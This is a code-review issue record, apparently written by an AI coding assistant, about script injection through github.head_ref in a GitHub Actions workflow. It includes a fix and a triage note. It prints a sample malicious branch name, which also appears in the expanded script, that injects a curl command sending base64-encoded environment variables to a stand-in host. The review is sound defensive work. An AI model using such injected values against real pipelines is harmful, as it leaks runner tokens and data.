---
provider: manual
pr:
round: 2
round_created_at: 2026-05-06T17:31:48Z
status: resolved
file: .github/workflows/ci.yml
line: 39
severity: critical
author: claude-code
provider_ref:
---

# Issue 001: Script injection via ${{ github.head_ref }} in branch-check run step

## Review Comment

`github.head_ref` is inlined directly into a `run:` shell script using the `${{ }}` expression syntax. The expression is expanded by GitHub Actions into the YAML before the shell executes it — it is not passed as a safe argument. An attacker submitting a PR from a fork can name their branch to contain shell metacharacters that break out of the `echo "..."` context and execute arbitrary code:

**Attack branch name:** `a"; curl https://exfil.example.com/$(env | base64) >/dev/null 2>&1; echo "a`

**Expanded run script:**
```bash
echo "a"; curl https://exfil.example.com/$(env | base64) >/dev/null 2>&1; echo "a" | \
grep -qE '^(TASK-[0-9]+/[a-z0-9][a-z0-9-]*|hotfix/.+)$' || \
{ echo "Branch must match TASK-XXXX/slug or hotfix/*"; exit 1; }
```

The curl command executes on the GitHub-hosted runner. For fork PRs, GitHub does not expose repository secrets, so `VPS_SSH_KEY` etc. are not at risk. However, the runner environment contains `GITHUB_TOKEN` (with read permissions), the repository checkout, and can make arbitrary outbound network requests. For a personal blog this may seem low-impact, but this is a critical-class vulnerability by standard classification — the fix is a one-line change.

**Fix**: Pass the value through an environment variable so GitHub Actions expression expansion is never injected into the shell script:

```yaml
      - name: Validate branch name
        env:
          BRANCH_NAME: ${{ github.head_ref }}
        run: |
          echo "$BRANCH_NAME" | \
          grep -qE '^(TASK-[0-9]+/[a-z0-9][a-z0-9-]*|hotfix/.+)$' || \
          { echo "Branch must match TASK-XXXX/slug or hotfix/*"; exit 1; }
```

`$BRANCH_NAME` (env var, dollar-prefixed) is safe — the shell reads it as data, not code.

## Triage

- Decision: `valid`
- Notes: `${{ github.head_ref }}` injected directly into `run:` shell script. GitHub Actions expands expression before shell executes, so attacker-controlled branch name can inject arbitrary shell commands. Fixed by moving value to `BRANCH_NAME` env var and referencing via `$BRANCH_NAME` (read as data, not code). ci.yml line 37-41 updated.
